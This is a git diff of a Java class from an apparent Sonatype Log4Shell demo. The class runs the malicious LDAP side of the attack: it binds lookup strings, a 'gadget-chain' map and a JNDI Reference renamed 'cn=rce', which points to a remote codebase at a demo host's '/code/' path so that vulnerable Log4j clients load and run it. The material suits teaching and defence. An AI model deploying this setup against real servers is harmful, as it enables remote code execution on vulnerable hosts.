@@ -2,12 +2,16 @@ package com.sonatype.demo.log4shell;
 
 
 
+import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
+
 import javax.naming.Context;
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
 import javax.naming.Reference;
 import java.util.HashMap;
 import java.util.Hashtable;
+import java.util.LinkedList;
+import java.util.List;
 
 public class LdapServerUploader {
 
@@ -17,7 +21,7 @@ public class LdapServerUploader {
 
     public LdapServerUploader() throws NamingException {
 
-        if(FrontEnd.inDockerContainer) {
+        if(DockerEnvironment.inDockerContainer) {
             ldapserver="ldap://ldap.dev:1389";
             refserver="http://server.dev:8080";
         }
@@ -40,14 +44,15 @@ public class LdapServerUploader {
 
 
             HashMap m =  new HashMap<>();
-
-
             m.put("key is $${sys:java.version}","${sys:java.version}");
-            String dn = "cn=map,dc=example,dc=org";
-            ctx.bind(dn, m);
-
-            String x="${sys:java.version}";
-            ctx.bind("cn=version,dc=example,dc=org",x);
+            List<String> list=new LinkedList<>();
+            list.add("this");
+             list.add("is");
+            list.add("a");
+            list.add("nested");
+            list.add("list");
+            m.put("gadget-chain",list);
+            ctx.bind("cn=gadget", m);
 
 
 
@@ -59,6 +64,6 @@ public class LdapServerUploader {
         ctx.bind("cn=404","nope - no idea");
 
         Reference ref = new Reference("ExternalObject","ExternalObject",refserver+"/code/");
-        ctx.bind("cn=bogus",ref);
+        ctx.bind("cn=rce",ref);
     }
 }
